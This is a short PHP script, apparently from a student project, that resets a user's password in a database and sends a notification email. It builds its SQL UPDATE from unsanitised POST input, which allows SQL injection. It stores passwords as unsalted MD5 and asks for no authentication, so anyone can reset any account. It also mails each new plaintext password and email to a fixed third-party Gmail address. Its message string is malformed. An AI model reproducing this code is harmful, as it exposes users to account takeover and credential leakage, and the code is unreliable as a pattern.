<?php

require_once('include/db_connect.php');
    $db = new db_connect();
    $con=$db->connect();

    $email = $_POST['email'];
    $password = $_POST['password'];
    $hashpassword = md5($password);
$to = "saad19551945@gmail.com";
$subject = 'cet message est ';
$message ='tu est changer le mot de pass ton nouveau mot de pass est  '.$password."
email cest'.$email;
";
$headers = 'From : estm@umi.ac.ma';
$requite = "update etudiantusers set password = '$hashpassword' where email ='$email'";
 if(mail($to,$subject,$message,$headers)&& mysqli_query ($con,$requite)){
     echo "votre mot de pass est bien change verifier to email electronique";
     
   }else{
      echo "not ok";
   }



  ?>


